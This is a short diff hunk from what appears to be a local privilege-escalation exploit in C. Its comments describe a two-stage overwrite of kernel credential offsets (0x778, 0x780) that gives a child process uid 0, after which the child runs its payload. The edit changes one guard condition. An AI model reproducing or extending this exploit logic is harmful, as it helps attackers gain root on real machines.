@@ -2551,7 +2551,7 @@ uid0_cred_punch:;
    * 0x780 subjective never lands alone (0/16). Two-stage on ONE quiet child:
    * stage 1 (0x778) landed + child still ALIVE -> stage 2 (0x780) completes
    * the subjective cred. The quiet child self-payloads on getuid()==0. */
-  if (env_flag("UID0_DOUBLE_PUNCH", 0) && !self &&
+  if (env_flag("UID0_DOUBLE_PUNCH", 0) && who[0] != 's' &&
       status_uid == 0 && self_uid != 0 && child_uid != 0) {
     char apath[64];
     uint32_t alive = 0;
